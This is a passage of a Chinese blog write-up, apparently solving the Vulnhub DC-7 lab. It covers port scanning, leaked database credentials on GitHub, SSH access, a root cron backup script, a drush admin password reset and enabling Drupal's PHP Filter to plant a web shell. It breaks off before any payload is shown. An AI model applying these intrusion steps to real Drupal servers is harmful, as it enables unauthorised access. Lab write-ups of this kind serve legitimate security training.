      <link href="/2020/03/09/Vulnhub-DC-7/"/>
      <url>/2020/03/09/Vulnhub-DC-7/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1302877408&auto=1&height=66"></iframe><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>DC-7是另一个专门构建的易受攻击的实验室，目的是在渗透测试领域积累经验。</p><p>尽管这不是一个过于技术性的挑战，但这并不容易。</p><p>虽然这是从早期DC版本开始的逻辑发展（我不会告诉您哪个），但是其中涉及一些新概念，但是您需要自己弄清楚这些概念。:-)如果您需要求助于暴力破解或字典攻击，您可能不会成功。</p><p>您需要做的是在盒子外面思考。</p><p>Waaaaaay在盒子外面。:-)</p><p>下载地址：<a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a></p><h2 id="运用的知识"><a href="#运用的知识" class="headerlink" title="运用的知识"></a>运用的知识</h2><p><code>Github</code>泄露网站数据库配置信息导致泄露<code>SSH</code><br><code>Drupal</code>重置网站管理员密码<br><code>Drupal8</code>-Getshell<br>第三方软件提权<code>backups.sh</code></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机先扫了扫端口开放服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.146</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1264.png" alt="图片"></p><p>靶机开放了 <code>22</code>（ssh）、<code>80</code>（http）服务，其中 <code>NMAP</code> 检测出 <code>http</code> 使用的网站是 <code>Drupal 8</code>，我们先打开看看把：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1265.png" alt="图片"></p><p>打开网站页面之后看到了一段提示信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DC-7</span><br><span class="line"></span><br><span class="line">DC-7 introduces some &quot;new&quot; concepts, but I&#x27;ll leave you to figure out what they are.  :-)</span><br><span class="line"></span><br><span class="line">While this challenge isn&#x27;t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won&#x27;t succeed.</span><br><span class="line"></span><br><span class="line">What you will have to do, is to think &quot;outside&quot; the box.</span><br><span class="line"></span><br><span class="line">Way &quot;outside&quot; the box.  :-)</span><br></pre></td></tr></table></figure><p>随后看了看 <code>robots.txt</code> 文件:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1266.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1267.png" alt="图片"></p><p>网站上只有这一个信息，那么我还是去找找有关于这个 <code>CMS</code> 的漏洞把：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1268.png" alt="图片"></p><p>由 <code>whatweb</code> 得到的信息它的版本是 <code>Drupal 8</code>，我搜索了有关于这个版本的漏洞发现有这些：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1269.png" alt="图片"></p><p>我挨个去利用了相关的 <code>POC</code> ，可惜都没有利用成功！这个时候回过头来再仔细读了一遍网站的提示我发现了一个版权信息：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1270.png" alt="图片"></p><p>既然作者提示我们说这个靶机的重点不在盒子里，是在盒子外面，而版权信息显示的是：<code>DC7USER</code>，那么会不会跟这个有关呢？</p><p>紧接着我抱着好奇心去 <code>Google</code> 搜索了 <code>DC7USER</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1271.png" alt="图片"></p><p>搜索第一个是它的 <code>Github</code>，我打开看了看发现有一个项目：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1272.png" alt="图片"></p><p>点开后我找到了有关线索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This is some &quot;code&quot; (yes, it&#x27;s not the greatest code, but that wasn&#x27;t the point) for the DC-7 challenge.</span><br><span class="line"></span><br><span class="line">This isn&#x27;t a flag, btw, but if you have made it here, well done anyway. :-)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1273.png" alt="图片"></p><p>这似乎是网站的源代码？于是我注意力放到了 ·config.php· 这个文件，打开看发现是一个数据库配置信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1274.png" alt="图片"></p><h2 id="登陆SSH"><a href="#登陆SSH" class="headerlink" title="登陆SSH"></a>登陆SSH</h2><p>我用得到的账号和密码尝试登陆网站发现登陆失败：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1275.png" alt="图片"></p><p>随后我尝试登陆 <code>SSH</code> 登陆成功！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1276.png" alt="图片"></p><p>挺有意思的啊，这个 CTF 靶机超出了我的想象，有点像真正的渗透测试了，有那个味道了有木有！</p><p>随后我发现了一个 <code>mbox</code> 的文件，里面貌似是一封邮件信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line">From root@dc-7 Thu Aug 29 17:00:22 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3EPu-0000CV-5C</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:15:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3EeF-0000Dx-G1</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EeF-0000Dx-G1@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:30:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Esl-0000Ec-JQ</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Esl-0000Ec-JQ@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:45:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3F7H-0000G3-Nb</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3F7H-0000G3-Nb@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 20:45:21 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Hvd-0000ED-CP</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Hvd-0000ED-CP@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 22:45:17 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 22:45:17 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Jng-0000Iw-Rq</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 22:45:16 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Jng-0000Iw-Rq@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 22:45:16 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 23:00:12 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3K28-0000Ll-11</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3K28-0000Ll-11@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 30 00:15:18 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3LCo-0000Eb-02</span><br><span class="line">        for root@dc-7; Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3LCo-0000Eb-02@dc-7&gt;</span><br><span class="line">Date: Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 30 03:15:17 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3O0y-0000Ed-To</span><br><span class="line">        for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3O0y-0000Ed-To@dc-7&gt;</span><br><span class="line">Date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1277.png" alt="图片"></p><p>仔细看了一看发现它是一个定时脚本：<code>/opt/script/backups.sh</code></p><p>我 <code>ls</code> 查看了一下，发现它只能 <code>root</code> 用户和 <code>www-data</code> 修改它，查看了脚本后好像删除了一些文件还有解压文件等等：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1278.png" alt="图片"></p><h2 id="Drupal重置网站管理员密码"><a href="#Drupal重置网站管理员密码" class="headerlink" title="Drupal重置网站管理员密码"></a>Drupal重置网站管理员密码</h2><p>其中的 drush 我并不知道是什么命令，紧接着我去搜索了一波发现它是一个简化了创建和管理Drupal8网站的命令行工具。</p><p>相关文章：<a href="https://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html">https://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html</a></p><p>看文档得知 <code>sql-dump</code>是使用<code>mysqldump</code>或等效的操作导出<code>Drupal</code>数据库为<code>SQL</code>的命令！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1279.png" alt="图片"></p><p>由于这个脚本上到处数据库所在的目录是 <code>/var/www/html</code>，那么我们也切换到这个目录，随后我用 <code>drush</code> 的命令重置了网站后台的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;pass&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1280.png" alt="图片"></p><p>重置完后拿到账号 <code>admin</code> 密码 <code>pass</code> 登陆到了网站后台：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1281.png" alt="图片"></p><h2 id="Drupal-Getshell"><a href="#Drupal-Getshell" class="headerlink" title="Drupal-Getshell"></a>Drupal-Getshell</h2><p>登陆到后台之后，我是 <code>Google</code> 上找到了<code>getshell</code>的方法，先是从 <a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a> 下载它的模块：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1282.png" alt="图片"></p><p>下载完后来到 <code>Extend</code> - <code>Install new module</code> 上传到网站：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1283.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1284.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1285.png" alt="图片"></p><p>然后启用 <code>PHP Filter</code> 模块：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1286.png" alt="图片"></p><p>启用之后在<code>Content</code> 中添加我们的脚本木马，添加脚本木马前先用 <code>MSF</code> 